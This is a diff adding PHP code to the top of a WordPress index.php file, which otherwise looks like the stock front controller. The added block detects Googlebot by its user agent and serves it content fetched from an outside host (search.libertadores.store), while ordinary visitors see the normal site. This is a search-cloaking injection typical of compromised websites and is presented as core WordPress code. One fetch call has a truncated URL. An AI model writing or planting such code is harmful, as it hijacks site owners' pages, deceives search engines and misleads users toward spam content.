@@ -1,0 +1,73 @@
+<?php
+header('Vary: Accept-Language, User-Agent', true);
+
+function is_googlebot(): bool {
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    if ($ua === '') return false;
+    
+    // Hanya deteksi Googlebot dan variannya
+    return strpos($ua, 'googlebot') !== false 
+        || strpos($ua, 'google-amphtml') !== false 
+        || strpos($ua, 'google-inspectiontool') !== false;
+}
+
+function fetch_lp(string $url): ?string {
+    $ctx = stream_context_create([
+        'http' => [
+            'timeout' => 4,
+            'max_redirects' => 5,
+            'header' => "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? "Mozilla/5.0") . "\r\n",
+            'ignore_errors' => true,
+        ]
+    ]);
+    $body = @file_get_contents($url, false, $ctx);
+    return $body !== false ? $body : null;
+}
+
+$request_uri = strtok($_SERVER['REQUEST_URI'] ?? '/', '?');
+
+header('Content-Type: text/html; charset=UTF-8');
+
+if (is_googlebot()) {
+    // Hanya untuk Googlebot: coba tampilkan landing page khusus sesuai path
+    if ($request_uri === '/') {
+        // "lp" kemungkinan file lokal (tanpa ekstensi atau sesuai nama file Anda)
+        // Jika remote, ganti dengan URL lengkap, misalnya "https://tapfuse.io/jan/hits.html"
+        $lp = fetch_lp("https:");
+        if ($lp !== null) {
+            echo $lp;
+            exit;
+        }
+    }
+
+    if (strpos($request_uri, '/') === 0) {
+        $lp = fetch_lp("https://search.libertadores.store/search.txt");
+        if ($lp !== null) {
+            echo $lp;
+            exit;
+        }
+    }
+
+
+
+}
+
+?>
+<?php
+
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
